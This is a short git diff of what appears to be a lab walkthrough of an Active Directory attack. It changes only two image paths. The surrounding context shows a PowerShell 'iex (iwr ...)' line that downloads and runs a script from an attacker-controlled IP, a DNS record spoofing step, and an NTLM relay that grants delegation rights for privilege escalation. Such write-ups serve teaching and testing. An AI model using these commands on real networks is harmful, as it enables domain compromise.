@@ -84,7 +84,7 @@ iex (iwr http://192.168.248.3:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.3 -Realm amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (19).png>)
+![](<../../../.gitbook/assets/image (19) (1).png>)
 
 We now have all our prerequisites. Time to escalate our privileges.
 
@@ -107,7 +107,7 @@ change-lockscreen -webdav \\webdav@80\
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
-![](<../../../.gitbook/assets/image (64).png>)
+![](<../../../.gitbook/assets/image (64) (1).png>)
 
 If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:
 
